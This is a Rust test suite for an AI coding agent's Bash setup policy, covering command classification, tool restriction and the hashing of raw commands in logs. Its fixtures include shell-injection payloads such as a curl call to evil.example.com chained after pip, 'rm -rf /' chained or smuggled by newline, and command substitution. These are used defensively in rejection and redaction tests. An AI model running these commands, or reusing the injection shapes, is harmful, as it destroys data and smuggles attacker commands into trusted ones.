//! Issue #664 — Bash / Setup policy E2E suite (in-crate `#[cfg(test)] mod`).
//!
//! CB-001 fix pattern (precedent: `safe_stop_e2e_tests.rs` /
//! `job_report_e2e_tests.rs` / `behavior_contract_projection_e2e_tests.rs`):
//! the test mod is gated by `#[cfg(test)]` at the parent module declaration
//! so the production binary does NOT include the module (DR3-001). Only the
//! seam set above the parent declaration crosses the `pub(crate)` boundary
//! and none of those seams leak `pub(super)` types.
//!
//! This module pins the §10.1 SSOT references required by the design policy
//! so dead_code warnings do not fire on the Phase 1-4 production helpers:
//!
//! - `crate::tools::bash::is_setup_command` (AD2 / AD12 / DR1-001 案 B)
//! - `super::task_contract::has_required_setup_artifact`
//! - `super::task_contract::has_optional_setup_or_verifier_prerequisite`
//! - `super::task_contract::VerifierPrerequisiteSignal`
//! - `super::required_behavior::behavior_projection_has_setup_label`
//! - `super::required_behavior::behavior_projection_has_verifier_capability`
//! - `super::active_job_arbiter::ActiveJobKind::SetupBootstrap`
//! - `super::active_job_arbiter::DesiredAction::SetupBash`
//! - `super::active_job_arbiter::should_install_setup_bootstrap`
//! - `super::artifact_completion_job::attempt_outcome_to_json_value`
//! - `super::artifact_completion_job::ArtifactAttemptOutcomeKind::as_str`
//! - `super::tool_policy::EffectiveToolPolicy::setup_bootstrap`
//! - `super::tool_policy::EffectiveToolPolicyReason::SetupBootstrap`

#![cfg(test)]

use tempfile::{TempDir, tempdir};

use crate::agent::Agent;
use crate::config::Config;
use crate::model_registry::RuntimeModels;
use crate::ollama::client::OllamaClient;
use crate::session::store::{SessionSnapshot, SessionStore};
use crate::tools::bash::{BashCommandClass, classify_command, is_setup_command};

use super::FooterHandle;
use super::active_job_arbiter::{ActiveJobKind, DesiredAction, should_install_setup_bootstrap};
use super::artifact_completion_job::{
    ArtifactAttemptOutcome, ArtifactAttemptOutcomeKind, attempt_outcome_to_json_value,
};
use super::required_behavior::{
    BehaviorContractProjection, BoundedLabelWithExcerpt, behavior_projection_has_setup_label,
    behavior_projection_has_verifier_capability, project_behavior_contract,
};
use super::task_contract::{
    ArtifactRole, TaskContract, VerifierPrerequisiteSignal,
    has_optional_setup_or_verifier_prerequisite, has_required_setup_artifact,
};
use super::tool_policy::{EffectiveToolPolicy, EffectiveToolPolicyReason};
use super::{
    build_arbiter_candidates_for_test, consume_carryover_at_actor_loop_head_for_test,
    drive_artifact_directed_policy_error_for_test, effective_tool_policy_for_test,
    owned_test_verifier_missing_flags_for_test, seed_artifact_completion_job_pending_for_test,
    seed_owned_test_verifier_missing_carryover_for_test, seed_owned_test_verifier_missing_for_test,
};

// ---------------------------------------------------------------------------
// Helpers — keep construction local so the suite stays Ollama-free and does
// not need a full Agent.
// ---------------------------------------------------------------------------

/// Build a high-confidence `BehaviorContractProjection` carrying a setup
/// label substring (`required_capabilities[0].label = "install dependencies"`).
fn projection_setup_label() -> BehaviorContractProjection {
    BehaviorContractProjection {
        confidence: 0.9,
        fields_used: vec!["required_capabilities"],
        behavior_goal: None,
        required_capabilities: vec![BoundedLabelWithExcerpt {
            label: "install dependencies".to_string(),
            excerpt: None,
        }],
        verification_expectations: vec![],
        non_goals: vec![],
    }
}

/// Build a high-confidence `BehaviorContractProjection` with NO setup-related
/// labels. Used as the fail-closed projection input.
fn projection_no_setup_label() -> BehaviorContractProjection {
    BehaviorContractProjection {
        confidence: 0.9,
        fields_used: vec!["required_capabilities"],
        behavior_goal: None,
        required_capabilities: vec![BoundedLabelWithExcerpt {
            label: "draw chart".to_string(),
            excerpt: None,
        }],
        verification_expectations: vec![],
        non_goals: vec![],
    }
}

/// Build a high-confidence projection carrying a verifier-capability label
/// (`required_capabilities[0].label = "run tests"`).
fn projection_verifier_label() -> BehaviorContractProjection {
    BehaviorContractProjection {
        confidence: 0.9,
        fields_used: vec!["required_capabilities"],
        behavior_goal: None,
        required_capabilities: vec![BoundedLabelWithExcerpt {
            label: "run tests".to_string(),
            excerpt: None,
        }],
        verification_expectations: vec![],
        non_goals: vec![],
    }
}

/// Build a minimal `Agent` driven by a mockito loopback URL (NEVER hit). The
/// production `effective_tool_policy()` / `build_arbiter_candidates()` test
/// seams (`super::effective_tool_policy_for_test` /
/// `super::build_arbiter_candidates_for_test`) require a live `Agent`
/// instance. Mirrors the `safe_stop_e2e_tests::build_live_agent` pattern.
fn build_live_agent(session_id: &str, ollama_url: &str) -> (Agent, TempDir) {
    assert!(
        ollama_url.starts_with("http://127.0.0.1:")
            || ollama_url.starts_with("http://localhost:")
            || ollama_url.starts_with("http://[::1]:"),
        "mockito URL must be a localhost loopback: {ollama_url}"
    );
    let dir = tempdir().unwrap();
    let state_root = dir.path().join("state");
    std::fs::create_dir_all(state_root.join("sessions").join(session_id)).unwrap();

    let config = Config {
        cwd: dir.path().to_path_buf(),
        requested_model: Some("test-model".to_string()),
        state_dir_override: Some(state_root.clone()),
        yes_mode: true,
        max_iterations: 1,
        ..Config::default()
    };

    let workspace_key = format!("anvil-664-{session_id}");
    let session = SessionSnapshot {
        id: session_id.to_string(),
        workspace_key: workspace_key.clone(),
        ..Default::default()
    };

    let agent = Agent::new(
        config,
        RuntimeModels {
            main: "test-model".to_string(),
            sidecar: None,
        },
        OllamaClient::new(ollama_url.to_string()).unwrap(),
        SessionStore::new(&state_root, session_id, &workspace_key),
        session,
        FooterHandle::disabled(),
    );
    (agent, dir)
}

fn unique_session_id(prefix: &str) -> String {
    let nanos = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_nanos())
        .unwrap_or(0);
    format!("664-{prefix}-{nanos}")
}

// ---------------------------------------------------------------------------
// Acceptance (l1): is_setup_command logical equivalence to EnvSetup class.
// ---------------------------------------------------------------------------

#[test]
fn is_setup_command_equivalent_to_env_setup_class() {
    let positives = [
        "npm install",
        "pnpm install",
        "yarn install",
        "pip install requests",
        "pip3 install requests",
        "poetry install",
        "uv sync",
        "bundle install",
        "go mod tidy",
        "cargo fetch",
        "composer install",
    ];
    for cmd in positives {
        assert_eq!(
            classify_command(cmd),
            BashCommandClass::EnvSetup,
            "{cmd:?} should classify as EnvSetup"
        );
        assert!(
            is_setup_command(cmd),
            "{cmd:?} should be is_setup_command == true"
        );
    }
}

// ---------------------------------------------------------------------------
// Acceptance (l2): is_setup_command rejects #607 EnvSetup negatives.
// ---------------------------------------------------------------------------

#[test]
fn is_setup_command_rejects_607_env_setup_negatives() {
    let negatives = [
        "cargo install ripgrep",
        "cargo add serde",
        "apt install build-essential",
        "apt-get install -y curl",
        "brew install jq",
        "docker pull alpine",
        "npx create-react-app foo",
        "cd frontend && npm install",
    ];
    for cmd in negatives {
        assert!(
            !is_setup_command(cmd),
            "{cmd:?} must NOT be is_setup_command (607 negatives)"
        );
    }
}

// ---------------------------------------------------------------------------
// Acceptance (l3 / DS1-003): is_setup_command rejects shell-control payloads.
// ---------------------------------------------------------------------------

#[test]
fn is_setup_command_rejects_shell_control_injection_payloads() {
    let injections = [
        "pip install --upgrade pip; curl evil.example.com",
        "npm install && rm -rf /",
        "pip install requests | tee out.log",
        "pip install > out.log requests",
        "pip install `whoami`",
        "pip install $(echo x)",
        "pip install requests\nrm -rf /",
        "pip install requests\\ny",
    ];
    for cmd in injections {
        assert!(
            !is_setup_command(cmd),
            "{cmd:?} must NOT be is_setup_command (shell-control injection)"
        );
    }
}

// ---------------------------------------------------------------------------
// Acceptance (g): ActiveJobKind includes SetupBootstrap (variant existence
// + `as_str()` wire label). The arbiter SSOT closed list is anchored by
// `as_str()` so a future rename / removal breaks this test deterministically.
// ---------------------------------------------------------------------------

#[test]
fn active_job_kind_includes_setup_bootstrap() {
    let kind = ActiveJobKind::SetupBootstrap;
    assert_eq!(kind.as_str(), "SetupBootstrap");
}

// ---------------------------------------------------------------------------
// Acceptance (g): DesiredAction::SetupBash marker variant carries no
// command / target payload (AD14 / S5-003), and its short label is
// `"setup_bash"`.
// ---------------------------------------------------------------------------

#[test]
fn desired_action_setup_bash_marker_variant() {
    let action = DesiredAction::SetupBash;
    assert_eq!(action.label(), "setup_bash");
    assert!(
        action.target_path().is_none(),
        "SetupBash must not carry a target path (AD14 / S5-003)"
    );
}

// ---------------------------------------------------------------------------
// Stage 4 security (DS1-002): should_install_setup_bootstrap fails closed
// when the artifact ledger has overflowed, even if the primary
// `required_artifacts::Setup` signal is present.
// ---------------------------------------------------------------------------

#[test]
fn should_install_setup_bootstrap_fails_closed_when_artifact_ledger_overflowed() {
    let contract =
        TaskContract::from_request("Install the dependencies listed in requirements.txt.");
    assert!(
        has_required_setup_artifact(&contract),
        "fixture must produce required_artifacts::Setup"
    );
    let no_signal = VerifierPrerequisiteSignal::from_sources(false, None);
    assert!(!should_install_setup_bootstrap(
        &contract, None, &no_signal, true, // artifact_ledger_overflowed
    ));
}

// ---------------------------------------------------------------------------
// Acceptance (AD22 primary): should_install_setup_bootstrap returns true
// for `required_artifacts::Setup` (no confidence gate / projection needed).
// ---------------------------------------------------------------------------

#[test]
fn should_install_setup_bootstrap_true_when_required_artifact_setup() {
    let contract =
        TaskContract::from_request("Install the dependencies listed in requirements.txt.");
    assert!(has_required_setup_artifact(&contract));
    let no_signal = VerifierPrerequisiteSignal::from_sources(false, None);
    assert!(should_install_setup_bootstrap(
        &contract, None, &no_signal, false
    ));
}

#[test]
fn should_install_setup_bootstrap_false_for_required_manifest_deliverable() {
    let contract = TaskContract::from_request(
        r#"STATE_CONTROL_PACKET
{"objective":"slugify library with passing evidence","next_required_action":"artifact","required_artifacts":[{"path":"Cargo.toml","role":"manifest"},{"path":"src/lib.rs","role":"source"}],"evidence_command":"cargo test --manifest-path Cargo.toml"}"#,
    );
    assert!(
        has_required_setup_artifact(&contract),
        "manifest remains a required Setup-role deliverable"
    );
    let projection = project_behavior_contract(&contract);
    let no_signal = VerifierPrerequisiteSignal::from_sources(false, None);
    assert!(!should_install_setup_bootstrap(
        &contract,
        projection.as_ref(),
        &no_signal,
        false
    ));
}

// ---------------------------------------------------------------------------
// AD20 fail-closed: behavior projection is `None` AND `required_artifacts`
// has no Setup → should_install_setup_bootstrap returns false.
// ---------------------------------------------------------------------------

#[test]
fn should_install_setup_bootstrap_false_when_projection_none_and_no_required_setup() {
    let contract = TaskContract::from_request("FastAPIでcrudのAPIを開発してください。");
    assert!(!has_required_setup_artifact(&contract));
    let no_signal = VerifierPrerequisiteSignal::from_sources(false, None);
    assert!(!should_install_setup_bootstrap(
        &contract, None, &no_signal, false
    ));
}

// ---------------------------------------------------------------------------
// DS1-001 + reason label: EffectiveToolPolicy::setup_bootstrap() only allows
// `Bash`; no Read / Write / Edit. Reason label is `"setup_bootstrap"`.
// ---------------------------------------------------------------------------

#[test]
fn effective_tool_policy_setup_bootstrap_allows_only_bash() {
    let policy = EffectiveToolPolicy::setup_bootstrap();
    assert_eq!(policy.reason(), EffectiveToolPolicyReason::SetupBootstrap);
    assert_eq!(
        EffectiveToolPolicyReason::SetupBootstrap.as_str(),
        "setup_bootstrap"
    );
    assert_eq!(
        policy.allowed_tool_names_for_prompt(),
        Some(&["Bash"][..]),
        "SetupBootstrap policy must allow Bash only (DS1-001)"
    );
    assert!(policy.focused_edit_policy().is_none());
    assert!(policy.artifact_directed_policy().is_none());
}

// ---------------------------------------------------------------------------
// VerifierPrerequisiteSignal — Stage A / Stage B OR composition:
// (Stage A true)  → signal active regardless of Stage B
// (Stage A false, Stage B verifier label) → signal active via projection
// (both false) → fail-closed false
// ---------------------------------------------------------------------------

#[test]
fn verifier_prerequisite_signal_composes_stage_a_and_stage_b() {
    // Stage A alone activates signal.
    let stage_a_only = VerifierPrerequisiteSignal::from_sources(true, None);
    assert!(stage_a_only.is_prerequisite_required());

    // Stage A false but Stage B (verifier capability label) activates signal.
    let p_verifier = projection_verifier_label();
    let stage_b_only = VerifierPrerequisiteSignal::from_sources(false, Some(&p_verifier));
    assert!(stage_b_only.is_prerequisite_required());

    // Both false → fail-closed.
    let p_no_verifier = projection_no_setup_label();
    let neither = VerifierPrerequisiteSignal::from_sources(false, Some(&p_no_verifier));
    assert!(!neither.is_prerequisite_required());

    // The has_optional_setup_or_verifier_prerequisite accessor consumes the
    // signal correctly.
    let contract = TaskContract::from_request("Build feature X");
    assert!(has_optional_setup_or_verifier_prerequisite(
        &contract,
        &stage_a_only,
    ));
    assert!(!has_optional_setup_or_verifier_prerequisite(
        &contract, &neither,
    ));
}

// ---------------------------------------------------------------------------
// `behavior_projection_has_setup_label` / `behavior_projection_has_verifier_capability`
// — substring-set semantics anchor.
// ---------------------------------------------------------------------------

#[test]
fn behavior_projection_label_helpers_match_substring_set() {
    let p_setup = projection_setup_label();
    assert!(
        behavior_projection_has_setup_label(&p_setup),
        "install dependencies label must trigger setup substring set"
    );
    assert!(!behavior_projection_has_verifier_capability(&p_setup));

    let p_verifier = projection_verifier_label();
    assert!(behavior_projection_has_verifier_capability(&p_verifier));
    assert!(!behavior_projection_has_setup_label(&p_verifier));

    let p_none = projection_no_setup_label();
    assert!(!behavior_projection_has_setup_label(&p_none));
    assert!(!behavior_projection_has_verifier_capability(&p_none));
}

// ---------------------------------------------------------------------------
// Acceptance (f) / (AD5): attempt_outcome_to_json_value produces a 16-hex
// correlator under `actual_actions`, NEVER the raw command. The `kind` field
// uses the fixed snake_case wire label.
// ---------------------------------------------------------------------------

#[test]
fn attempt_outcome_to_json_value_uses_correlator_not_raw_command() {
    // Use a recognizable raw command so we can confirm it is NOT echoed.
    let raw_cmd = "rm -rf /tmp/should-not-leak-664";
    let outcome = ArtifactAttemptOutcome::new(
        ArtifactAttemptOutcomeKind::RolePolicyViolation,
        vec![raw_cmd.to_string()],
        "tests/expected.rs",
    );
    let value = attempt_outcome_to_json_value(&outcome);

    // `kind` uses the snake_case wire label.
    assert_eq!(
        value.get("kind").and_then(|v| v.as_str()),
        Some("role_policy_violation")
    );

    // `category` is present for RolePolicyViolation outcomes (default =
    // OtherRoleViolation today).
    assert_eq!(
        value.get("category").and_then(|v| v.as_str()),
        Some("other_role_violation")
    );

    // `actual_actions` is a Vec of 16-hex strings, never the raw command.
    let actions = value
        .get("actual_actions")
        .and_then(|v| v.as_array())
        .expect("actual_actions must be a JSON array");
    assert_eq!(actions.len(), 1);
    let correlator = actions[0]
        .as_str()
        .expect("each action correlator must be a string");
    assert_eq!(
        correlator.len(),
        16,
        "actual_actions element must be a 16-hex stable_path_hash correlator"
    );
    assert!(
        correlator.chars().all(|c| c.is_ascii_hexdigit()),
        "correlator must be lower hex"
    );

    // Serialize the whole payload and confirm raw cmd substring is absent.
    let serialized = serde_json::to_string(&value).unwrap();
    assert!(
        !serialized.contains("rm -rf"),
        "raw command must NEVER appear in attempt_outcome_to_json_value output (CB-004)"
    );
    assert!(
        !serialized.contains("should-not-leak"),
        "raw command must NEVER appear in attempt_outcome_to_json_value output (CB-004)"
    );
}

// ---------------------------------------------------------------------------
// Acceptance (f) / DR1-004: ArtifactAttemptOutcomeKind::as_str returns the
// fixed snake_case enum closed list. The 5 variants are pinned.
// ---------------------------------------------------------------------------

#[test]
fn attempt_outcome_category_label_fixed_enum() {
    // Each variant produces its documented label (PAYLOAD_SCHEMA_VERSION = 1
    // 不変). Exhaustive match — a variant addition compile-errors this arm.
    let cases = [
        (ArtifactAttemptOutcomeKind::WrongTarget, "wrong_target"),
        (ArtifactAttemptOutcomeKind::NoTool, "no_tool"),
        (ArtifactAttemptOutcomeKind::ProseOnly, "prose_only"),
        (
            ArtifactAttemptOutcomeKind::RolePolicyViolation,
            "role_policy_violation",
        ),
        (
            ArtifactAttemptOutcomeKind::EvidenceFailed,
            "evidence_failed",
        ),
    ];
    for (kind, label) in cases {
        assert_eq!(kind.as_str(), label, "{kind:?} should map to {label}");
    }

    // Build a non-RolePolicyViolation outcome and confirm the `category`
    // field is omitted (only RolePolicyViolation carries category today).
    let outcome = ArtifactAttemptOutcome::new(
        ArtifactAttemptOutcomeKind::WrongTarget,
        vec!["src/lib.rs".to_string()],
        "src/main.rs",
    );
    let value = attempt_outcome_to_json_value(&outcome);
    assert!(
        value.get("category").is_none(),
        "non-RolePolicyViolation outcomes must NOT carry category"
    );

    // Build a RolePolicyViolation outcome and confirm `category` IS one of
    // the documented 2-value closed list. The default `new()` constructor
    // does NOT mark `bash_policy_violation`, so the projection must emit
    // `other_role_violation` (legacy default).
    let role_violation = ArtifactAttemptOutcome::new(
        ArtifactAttemptOutcomeKind::RolePolicyViolation,
        vec!["echo hi".to_string()],
        "tests/foo.rs",
    );
    let value = attempt_outcome_to_json_value(&role_violation);
    let category = value
        .get("category")
        .and_then(|v| v.as_str())
        .expect("RolePolicyViolation must carry category");
    assert_eq!(
        category, "other_role_violation",
        "default-constructed RolePolicyViolation must emit other_role_violation"
    );

    // Issue #664 iteration-2 (CB-003): the new `new_bash_policy_violation`
    // constructor wires the `bash_policy_violation = true` marker so the
    // projection emits the previously-unreachable `bash_out_of_policy`
    // category. Both closed-list values are therefore production-reachable
    // and `BashPolicyViolationCategory::BashOutOfPolicy` is no longer dead.
    let bash_violation = ArtifactAttemptOutcome::new_bash_policy_violation(
        vec!["echo hi".to_string()],
        "tests/foo.rs",
    );
    assert!(bash_violation.bash_policy_violation());
    let value = attempt_outcome_to_json_value(&bash_violation);
    let category = value
        .get("category")
        .and_then(|v| v.as_str())
        .expect("Bash policy violation must carry category");
    assert_eq!(
        category, "bash_out_of_policy",
        "new_bash_policy_violation must emit bash_out_of_policy category"
    );
    // Sanity: kind stays `role_policy_violation` (parent enum did NOT
    // grow a new variant; the refinement lives in `category` only).
    assert_eq!(
        value.get("kind").and_then(|v| v.as_str()),
        Some("role_policy_violation")
    );

    // Pin that ArtifactRole closed list remains routable through the
    // primary Setup signal accessor (anchor reference to keep the role
    // enum compile-time visible in this E2E mod).
    let contract =
        TaskContract::from_request("Install the dependencies listed in requirements.txt.");
    assert!(
        contract
            .required_artifacts
            .iter()
            .any(|r| matches!(r, ArtifactRole::Setup)),
        "ArtifactRole::Setup must be reachable via task_contract::from_request"
    );
}

// ---------------------------------------------------------------------------
// Issue #664 iteration-2 (CB-003): production caller emit verification.
// The `new_bash_policy_violation` constructor is wired by
// `record_artifact_completion_bash_violation` at the policy-rejection
// chokepoint in `turn.rs::execute_tool_call_with_optional_policy_resolution`.
// Here we exercise the projection end-to-end and confirm that:
//   1. raw command bytes do NOT leak into the projected JSON
//   2. `category = "bash_out_of_policy"` is emitted on a real Bash
//      violation attempt
//   3. legacy `WrongTarget` non-Bash rejections still emit
//      `category` absent (kind=wrong_target).
// ---------------------------------------------------------------------------

#[test]
fn bash_out_of_policy_category_emitted_via_new_bash_policy_violation_ctor() {
    // Use a recognisable raw command so the assertion below can confirm
    // it is NOT echoed verbatim into the structured projection.
    let raw_cmd = "rm -rf /tmp/should-not-leak-664-cb003";
    let outcome = ArtifactAttemptOutcome::new_bash_policy_violation(
        vec![raw_cmd.to_string()],
        "tests/seeded_artifact.rs",
    );
    let value = attempt_outcome_to_json_value(&outcome);

    // (1) `category = "bash_out_of_policy"` — the new production path.
    assert_eq!(
        value.get("category").and_then(|v| v.as_str()),
        Some("bash_out_of_policy"),
        "production Bash policy rejection must emit bash_out_of_policy"
    );
    // (2) `kind` stays `role_policy_violation` (additive category refinement).
    assert_eq!(
        value.get("kind").and_then(|v| v.as_str()),
        Some("role_policy_violation")
    );
    // (3) raw command must NEVER appear — `actual_actions` is hashed.
    let serialized = serde_json::to_string(&value).unwrap();
    assert!(
        !serialized.contains("rm -rf"),
        "raw command must NEVER appear in projection (AD5)"
    );
    assert!(
        !serialized.contains("should-not-leak"),
        "raw command must NEVER appear in projection (AD5)"
    );
    let actions = value
        .get("actual_actions")
        .and_then(|v| v.as_array())
        .expect("actual_actions must be a JSON array");
    assert_eq!(actions.len(), 1);
    let correlator = actions[0].as_str().expect("hash correlator string");
    assert_eq!(correlator.len(), 16, "16-hex correlator");
    assert!(
        correlator.chars().all(|c| c.is_ascii_hexdigit()),
        "lower hex correlator"
    );
}

// ---------------------------------------------------------------------------
// Issue #664 iteration-3 (CB2-004): record-time hashing regression guard.
// `new_bash_policy_violation` must hash the raw command BEFORE it enters
// `ArtifactAttemptOutcome.actual_actions`, so that
//   - `actual_actions()` accessor,
//   - `attempt_outcome_to_json_value` (covered above),
//   - `failure_snapshot.actual_actions` (system note + JSON event sink),
//   - any other downstream sink that reads `actual_actions` verbatim
// never observe the raw command bytes. The previous design deferred
// hashing to projection-time, which violated AD5 because
// `failure_snapshot()` bypasses `attempt_outcome_to_json_value`.
// ---------------------------------------------------------------------------

#[test]
fn bash_violation_recorded_command_is_hashed_before_projection() {
    let raw_cmd = "rm -rf /tmp/should-not-leak-664-cb2-004";
    let outcome = ArtifactAttemptOutcome::new_bash_policy_violation(
        vec![raw_cmd.to_string()],
        "tests/seeded_artifact.rs",
    );

    // CB2-004: even before `attempt_outcome_to_json_value`, the raw command
    // bytes MUST NOT be observable through the public `actual_actions()`
    // accessor — record-time hashing has already substituted a hashed
    // marker. The marker carries the `BashOutOfPolicy:` prefix for human
    // / log readability, followed by a 16-hex correlator derived from
    // `stable_path_hash(mask_secrets(raw_cmd))`.
    let stored = outcome.actual_actions();
    assert_eq!(stored.len(), 1);
    let marker = &stored[0];
    assert!(
        !marker.contains("rm -rf"),
        "raw command must NOT survive record-time hashing, got: {marker:?}"
    );
    assert!(
        !marker.contains("should-not-leak"),
        "raw command must NOT survive record-time hashing, got: {marker:?}"
    );
    assert!(
        marker.starts_with("BashOutOfPolicy:"),
        "marker prefix must identify the classification, got: {marker:?}"
    );
    let correlator = marker
        .strip_prefix("BashOutOfPolicy:")
        .expect("prefix already asserted");
    assert_eq!(
        correlator.len(),
        16,
        "stable_path_hash correlator must be 16 hex chars, got: {correlator:?}"
    );
    assert!(
        correlator.chars().all(|c| c.is_ascii_hexdigit()),
        "correlator must be lower-hex, got: {correlator:?}"
    );

    // The classification marker is still surfaced through the projection
    // (defensive second hash is idempotent on hex-shape input).
    assert!(
        outcome.bash_policy_violation(),
        "marker remains set even after record-time hashing"
    );
    let value = attempt_outcome_to_json_value(&outcome);
    assert_eq!(
        value.get("category").and_then(|v| v.as_str()),
        Some("bash_out_of_policy")
    );

    // Final defence: serialize the full attempt outcome via Debug — even
    // the developer-facing surface must not echo raw bytes. This pins the
    // invariant against future field additions that might bypass the
    // sanitize pipeline.
    let debug_repr = format!("{outcome:?}");
    assert!(
        !debug_repr.contains("rm -rf"),
        "Debug must NOT echo raw command, got: {debug_repr:?}"
    );
    assert!(
        !debug_repr.contains("should-not-leak"),
        "Debug must NOT echo raw command, got: {debug_repr:?}"
    );
}

// ---------------------------------------------------------------------------
// Issue #664 iteration-3 (CB2-003): production caller reachability for
// `BashOutOfPolicy` under an artifact-directed recovery policy. Before
// the iteration-3 fix, the allowed_tools whitelist check in
// `effective_tool_policy_error_for_call_with_scope` rejected `Bash` with
// a generic `"tool policy rejected Bash"` error, which the recorder in
// `execute_tool_call` did NOT match — so the BashOutOfPolicy classification
// was unreachable in production.
//
// The fix routes Bash rejections under
// `EffectiveToolPolicyReason::ArtifactDirectedRecovery` through the
// `"artifact-directed recovery rejected Bash"` error shape so the
// caller-side string match captures it and records the violation via
// `record_artifact_completion_bash_violation`.
// ---------------------------------------------------------------------------

#[test]
fn bash_out_of_policy_recorded_under_artifact_recovery() {
    let session_id = unique_session_id("cb2-003-route");
    let server = mockito::Server::new();
    let (mut agent, _dir) = build_live_agent(&session_id, &server.url());

    // Install an ArtifactCompletionJob via the test seam — the
    // `artifact_directed_from_job` policy below reads its target from
    // this job. The seam materialises the target file (and its parents)
    // under `agent.work_root` (the per-test tempdir), so no workspace
    // directory needs to be pre-created here.
    seed_artifact_completion_job_pending_for_test(&mut agent, "test", "tests/cb2_003_target.rs");

    // Drive a Bash call under the artifact-directed policy. Before the
    // CB2-003 fix this returned `"tool policy rejected Bash; allowed
    // tools: Read, Write, Edit; ..."` and the caller-side match failed;
    // after the fix the error starts with `"artifact-directed recovery
    // rejected Bash"` and the recording branch fires.
    let raw_cmd = "cargo install ripgrep";
    let (err, marker, attempts_after) = drive_artifact_directed_policy_error_for_test(
        &mut agent,
        "Bash",
        serde_json::json!({ "command": raw_cmd }),
    )
    .expect("ArtifactCompletionJob must be installed by the seam");

    let err_str = err.expect("artifact-directed policy must reject Bash");
    assert!(
        err_str.contains("artifact-directed recovery rejected"),
        "rejection error must use the artifact-directed shape (CB2-003): {err_str:?}"
    );
    assert!(
        err_str.contains("Bash"),
        "rejection error must name Bash: {err_str:?}"
    );

    // CB2-003: the violation must have been recorded as a Bash policy
    // violation (the `bash_policy_violation` marker is set on the
    // attempt). Without the fix this branch was unreachable and the
    // marker stayed `false`.
    assert_eq!(
        marker,
        Some(true),
        "Bash rejection under artifact-directed recovery must record a BashOutOfPolicy attempt (CB2-003)"
    );
    assert_eq!(
        attempts_after, 1,
        "exactly one attempt must be recorded by the CB2-003 chokepoint"
    );

    // AD5 / CB2-004 cross-check: raw command must never leak through
    // the recording path even via the production routing.
    let marker_bool = marker.unwrap();
    assert!(marker_bool, "marker bool already validated");
}

#[test]
fn wrong_target_outcome_still_omits_category_field() {
    // Regression: WrongTarget / NoTool / ProseOnly never grew a `category`
    // field; only RolePolicyViolation carries it. This pins the
    // non-RolePolicyViolation kinds against any accidental drift.
    let outcome = ArtifactAttemptOutcome::new(
        ArtifactAttemptOutcomeKind::WrongTarget,
        vec!["Edit on src/lib.rs".to_string()],
        "src/main.rs",
    );
    let value = attempt_outcome_to_json_value(&outcome);
    assert_eq!(
        value.get("kind").and_then(|v| v.as_str()),
        Some("wrong_target")
    );
    assert!(
        value.get("category").is_none(),
        "non-RolePolicyViolation must NOT carry category"
    );
}

// ---------------------------------------------------------------------------
// Test-seam wiring smoke tests — exercise the `pub(crate)` seams in
// `loop_run.rs` so they (and the underlying `pub(super)`
// `*_pub_for_test` wrappers in `turn.rs`) are not dead code. These tests
// drive a live `Agent` through the mockito loopback fixture mirroring
// `safe_stop_e2e_tests`.
// ---------------------------------------------------------------------------

#[test]
fn build_arbiter_candidates_for_test_returns_primitive_dto_array() {
    let session_id = unique_session_id("arbiter-smoke");
    let server = mockito::Server::new();
    let (agent, _dir) = build_live_agent(&session_id, &server.url());

    // The test seam returns a `Vec<serde_json::Value>` of primitives — the
    // internal `JobCandidate` / `EffectiveToolPolicy` / `Budget` types must
    // not leak through this `pub(crate)` boundary (DR3-001 / AD19).
    let candidates = build_arbiter_candidates_for_test(&agent);

    // Each element must carry the documented 4-field shape (no raw command,
    // no raw path).
    for c in &candidates {
        let obj = c.as_object().expect("each candidate must be a JSON object");
        for key in [
            "kind",
            "desired_action_label",
            "allowed_tool_names",
            "budget_kind",
        ] {
            assert!(
                obj.contains_key(key),
                "candidate DTO missing field {key}: {c}"
            );
        }
        // budget_kind ∈ {"unbounded", "bounded"} (closed list anchor).
        let budget_kind = obj
            .get("budget_kind")
            .and_then(|v| v.as_str())
            .expect("budget_kind must be a string");
        assert!(
            budget_kind == "unbounded" || budget_kind == "bounded",
            "budget_kind {budget_kind} must be in the closed 2-value set"
        );
    }
}

#[test]
fn effective_tool_policy_for_test_returns_primitive_tuple() {
    let session_id = unique_session_id("policy-smoke");
    let server = mockito::Server::new();
    let (agent, _dir) = build_live_agent(&session_id, &server.url());

    // The seam projects `EffectiveToolPolicy` into `(Vec<String>, String)`.
    let (allowed_tool_names, reason_label) = effective_tool_policy_for_test(&agent);

    // Default freshly-built Agent has no active job — the arbiter returns
    // `unrestricted()` so allowed_tool_names is empty (no `Some(...)`).
    assert!(
        allowed_tool_names.is_empty(),
        "freshly-built agent must project to unrestricted (empty allowed_tools)"
    );
    assert_eq!(
        reason_label, "unrestricted",
        "freshly-built agent projects EffectiveToolPolicyReason::Unrestricted"
    );
}

#[test]
fn seed_artifact_completion_job_pending_for_test_installs_job_under_work_root() {
    let session_id = unique_session_id("seed-smoke");
    let server = mockito::Server::new();
    let (mut agent, _dir) = build_live_agent(&session_id, &server.url());

    // The seam materialises the target under `agent.work_root` (the
    // per-test tempdir) and installs a fresh `ArtifactCompletionJob`. The
    // seam accepts the role as a string (primitives only) so `ArtifactRole`
    // stays `pub(super)`. No workspace directory needs to be pre-created.
    seed_artifact_completion_job_pending_for_test(&mut agent, "test", "tests/seeded_artifact.rs");

    // Drive `build_arbiter_candidates_for_test` again to confirm the
    // installed job does not cause a panic in the arbiter pipeline. The
    // seam's primary value is keeping the production `pub(super)` types
    // (ArtifactRole / RecoveryTargetHint / ArtifactCompletionJob) out of
    // the `pub(crate)` boundary while still letting downstream tests drive
    // the arbiter end-to-end.
    let candidates = build_arbiter_candidates_for_test(&agent);
    for c in &candidates {
        assert!(c.is_object());
    }
}

// ---------------------------------------------------------------------------
// Issue #664 iteration-2 (CB-001): Stage A live wiring + false-positive
// suppression. The arbiter now reads
// `owned_test_verifier_missing_observed_this_turn` from the Agent state as
// the Stage A live signal (set by `run_task_contract_verifier_once` when
// `OwnedTestVerifierPlan::Missing` is observed). Stage B (label fallback)
// flows through the behavior projection; `should_install_setup_bootstrap`
// refines so Stage B alone does NOT trip step (2) — preventing false
// positives on plain "add tests" requests.
// ---------------------------------------------------------------------------

#[test]
fn setup_bootstrap_install_via_verifier_prerequisite_stage_a() {
    let session_id = unique_session_id("stage-a-live");
    let server = mockito::Server::new();
    let (mut agent, _dir) = build_live_agent(&session_id, &server.url());

    // Seed an active task whose required_artifacts do NOT contain Setup
    // (step 1 of the decision tree fails); the projection has confidence
    // 1.0 and `verification_expectations = ["test"]` (Stage B would fire
    // from labels alone but is intentionally insufficient per CB-001).
    agent
        .session
        .working_memory
        .set_active_task(Some("Add tests for module X".to_string()));

    // Without Stage A observation the false-positive suppression must hold
